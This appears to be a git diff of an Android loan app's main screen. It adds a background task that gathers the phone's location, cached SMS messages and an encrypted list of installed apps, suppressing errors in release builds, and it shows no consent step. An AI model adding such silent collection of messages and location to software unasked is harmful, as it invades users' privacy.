@@ -19,12 +19,15 @@ import android.widget.Toast;
 
 import com.alibaba.fastjson.JSONObject;
 import com.blankj.utilcode.util.JsonUtils;
+import com.blankj.utilcode.util.ThreadUtils;
 import com.google.firebase.messaging.FirebaseMessaging;
 import com.tiny.cash.loan.card.Constants;
 import com.tiny.cash.loan.card.collect.BaseCollectDataMgr;
 import com.tiny.cash.loan.card.collect.CollectDataMgr;
+import com.tiny.cash.loan.card.collect.LocationMgr;
 import com.tiny.cash.loan.card.collect.item.CollectAppInfoMgr;
 import com.tiny.cash.loan.card.collect.item.CollectSmsMgr;
+import com.tiny.cash.loan.card.feature.repayment.PaymentMethodActivity;
 import com.tiny.cash.loan.card.feature.users.ContactsActivity;
 import com.tiny.cash.loan.card.kudicredit.BuildConfig;
 import com.tiny.cash.loan.card.kudicredit.R;
@@ -772,7 +775,10 @@ public class MainActivity extends BaseActivity {
     }
 
     private void test1() {
-//        startIntent(ContactsActivity.class);
+        startIntent(PaymentMethodActivity.class);
+        if (true) {
+            return;
+        }
         CollectDataMgr.Companion.getSInstance().collectAuthData("11111111", new BaseCollectDataMgr.Observer() {
             @Override
             public void success(@Nullable AuthResult response) {
@@ -787,7 +793,26 @@ public class MainActivity extends BaseActivity {
     }
 
     private void executeCache() {
-        CollectSmsMgr.Companion.getSInstance().tryCacheSms();
-        CollectAppInfoMgr.Companion.getSInstance().getAesAppInfoStr();
+        ThreadUtils.executeByCached(new ThreadUtils.SimpleTask<Object>() {
+            @Override
+            public Object doInBackground() throws Throwable {
+                try {
+                    LocationMgr.getInstance().getLocation();
+                    CollectSmsMgr.Companion.getSInstance().tryCacheSms();
+                    CollectAppInfoMgr.Companion.getSInstance().getAesAppInfoStr();
+                } catch (Exception e) {
+                    if (BuildConfig.DEBUG) {
+                        throw e;
+                    }
+                }
+                return null;
+            }
+
+            @Override
+            public void onSuccess(Object result) {
+
+            }
+        });
+
     }
 }
